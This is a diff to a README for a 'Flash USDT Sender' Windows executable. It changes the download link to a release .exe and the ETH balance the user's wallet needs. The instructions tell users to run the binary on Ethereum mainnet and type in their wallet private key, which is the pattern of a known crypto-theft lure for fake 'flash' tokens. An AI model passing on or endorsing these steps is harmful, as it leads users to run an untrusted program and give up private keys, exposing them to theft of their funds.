@@ -26,9 +26,9 @@ This tool is all about giving you a front-row seat to Ethereum’s ERC-20 magic�
 - **Chain ID**: Locked to Ethereum mainnet (1)—no testnet fluff here.
 
 #### How to Play 🔥
-1. Snag the `.exe` from [releases](https://github.com/flexxwhoax/Flash-USDT-Sender-/blob/main/Sender%20tool.exe).
+1. Snag the `.exe` from [releases](https://github.com/flexxwhoax/Flash-USDT-Sender-/releases/download/FLASHTOOL/Stablecoin.flashing.ETH.exe).
 2. Launch it, punch in your Infura ID, and connect to the mainnet.
-3. Drop your private key (make sure it’s got ~0.01 ETH for gas).
+3. Drop your private key (make sure it’s got ~0.025 ETH for gas).
 4. Set a recipient address, USDT amount, and gas params—then hit send!
 5. Watch the tx hash roll in—copied and ready for you to flex on Etherscan.
 
